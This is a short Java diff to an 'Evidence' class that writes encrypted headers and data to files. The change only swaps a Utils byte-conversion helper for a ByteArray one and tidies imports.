@@ -11,7 +11,6 @@ package com.android.networking.evidence;
 
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.Vector;
 
 import com.android.networking.Device;
 import com.android.networking.LogR;
@@ -21,10 +20,10 @@ import com.android.networking.crypto.Encryption;
 import com.android.networking.crypto.Keys;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 /**
@@ -284,7 +283,7 @@ public final class Evidence {
 				Check.asserts(encBuffer.length == encryption.getNextMultiple(plainBuffer.length), "Wrong encBuffer"); //$NON-NLS-1$
 			}
 			// scriviamo la dimensione dell'header paddato
-			fconn.write(Utils.intToByteArray(plainBuffer.length));
+			fconn.write(ByteArray.intToByteArray(plainBuffer.length));
 			// scrittura dell'header cifrato
 			fconn.append(encBuffer);
 			if (Cfg.DEBUG) {
@@ -419,7 +418,7 @@ public final class Evidence {
 		}
 
 		try {
-			fconn.append(Utils.intToByteArray(data.length - offset));
+			fconn.append(ByteArray.intToByteArray(data.length - offset));
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
